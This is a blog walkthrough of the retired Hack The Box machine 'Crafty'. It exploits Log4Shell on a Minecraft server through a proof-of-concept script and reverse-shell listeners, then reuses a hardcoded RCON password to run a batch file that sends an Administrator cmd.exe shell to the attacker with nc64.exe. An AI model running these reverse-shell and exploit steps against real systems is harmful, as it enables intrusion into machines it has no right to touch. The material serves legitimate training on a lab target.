---
title: "HTB Walkthrough: Crafty"
date: 2024-08-09
categories: [pentesting]
tags: [HTB, Crafty, Minecraft, Log4Shell, Nmap, Privilege Escalation, Walkthrough]
author: Harmehar Kaur
image:
  path: /assets/pentest.jpg
  alt: 
---

## 🧠 Introduction

Crafty is all about exploiting a Minecraft server. Minecraft was notoriously vulnerable to **Log4Shell** due to its use of the Java Log4J package. I used a free Minecraft command line client to connect and send a Log4Shell payload to get a shell on the box. From there, I found a plugin for the Minecraft server and reversed it to find the administrator password. In the *Beyond Root* section, I examined the `web.config` file for the static website.

This retired HTB machine is an excellent one for beginners—it took me nearly 6 hours to capture the flags, and this writeup is for anyone who might find themselves stuck like I was.

---

## 🔍 Step 1: Reconnaissance

### Nmap Scan

**Nmap** (Network Mapper) is an open-source tool used for vulnerability scanning and network discovery.

```bash
sudo nmap -sV -p- --min-rate=10000 10.10.11.249
```

**Command Breakdown:**

- `sudo`: Run with root privileges
- `nmap`: The scanning tool
- `-sV`: Service version detection
- `-p-`: Scan all 65535 TCP ports
- `--min-rate=10000`: Send packets quickly
- `10.10.11.249`: Target IP

#### Result

Two open ports:

- Minecraft
- HTTP (httpd 10.0 – not vulnerable)

Minecraft 1.16.5 is vulnerable to **Log4j**, which we’ll exploit.

### Updating /etc/hosts

When accessing the IP in a browser failed, I edited the hosts file:

```bash
sudo nano /etc/hosts
```

Added:

```
10.10.11.249 crafty.htb
```

You may also add `play.crafty.htb`. Viewing the site source revealed nothing useful.

---

## 🕵️‍♂️ Understanding Log4Shell

**Log4Shell** (CVE-2021-44228) is a critical **RCE** vulnerability in Apache Log4j 2.

> "Log4Shell allows hackers to run virtually any code they want..." – IBM

Minecraft was directly impacted by this vulnerability.  
[See official statement from Minecraft](https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition)

---

## 🎮 Exploiting Minecraft Server

### Step-by-step:

```bash
wget https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20231011-230/MinecraftClient-20231011-230-linux-x64
mv MinecraftClient-20231011-230-linux-x64 mcli
chmod +x mcli
./mcli <any_name> "" 10.129.230.60
```

Press Enter when prompted for password.

### PoC for Log4Shell

Cloned PoC from GitHub and installed JDK.  
Used the following commands after downloading `jdk-8u20-linux-x64.tar.gz`:

```bash
tar xf jdk-8u20-linux-x64.tar.gz
rm jdk-8u20-linux-x64.tar.gz
```

Ran exploit:

```bash
python poc.py --userip 10.10.14.52 --webport 8000 --lport 443
```

### Issue and Fix

Default payload used `/bin/sh`, which doesn’t work on Windows.  
Changed to:

```java
String cmd = "cmd.exe";
```

### Set Up Listener

```bash
rlwrap -cAr nc -lnvp 443
```

🎉 A reverse shell was received!

---

## 🧑‍💻 Step 2: Getting the User Flag

Located at:

```plaintext
C:\Users\crafty\Desktop\user.txt
```

---

## 🧠 Step 3: Privilege Escalation

### Steps Taken:

1. Found 3 users – `Public`, `crafty`, and `Administrator`
2. `Public` was empty; `Administrator` looked promising
3. Decompressed and reversed a Minecraft plugin

Found hardcoded RCON password:

```java
Rcon rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());
```

Used to access:

```plaintext
C:\inetpub\wwwroot\playercount.txt
```

---

### Gaining Root Access

Created files:

- `b64.txt`
- `shell.bat`:

```bat
@echo on
c:\windows\temp\nc64.exe 10.10.14.48 4444 -e cmd.exe
```

Set up a listener:

```bash
nc -lnvp 4444
```

Used:

```powershell
.\RunasCs.exe -l 2 administrator s67u84zKq8IXw "c:\temp\shell.bat"
```

Received Administrator shell. Retrieved:

```plaintext
C:\Users\Administrator\Desktop\root.txt
```

---

## ✅ Conclusion

- Crafted payload to exploit Log4Shell on Minecraft
- Gained user access
- Used plugin reverse engineering to elevate privileges
- Captured both flags

---
